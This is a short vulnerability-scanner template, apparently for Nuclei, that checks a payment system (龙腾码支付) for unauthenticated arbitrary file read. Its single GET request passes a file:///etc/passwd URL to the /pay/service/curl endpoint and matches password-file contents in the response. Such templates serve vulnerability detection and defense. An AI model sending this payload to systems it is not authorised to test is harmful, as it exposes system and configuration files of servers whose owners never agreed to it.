id: zfepay_curl_fileread

info:
  name: 龙腾码支付 curl 任意文件读取漏洞
  author: slack
  severity: high
  description: |
    龙腾码支付 /pay/service/curl 接口处存在任意文件读取漏洞，未经身份验证的攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。
  reference:
    - https://cn-sec.com/archives/4033916.html
  tags: 龙腾码支付

http:
  - method: GET
    path:
      - "{{BaseURL}}/pay/service/curl?url=file:///etc/passwd"
    matchers:
      - type: status
        status:
          - 200
    extractors:
      - type: regex
        part: body
        regex:
          - "root:.*:0:0:"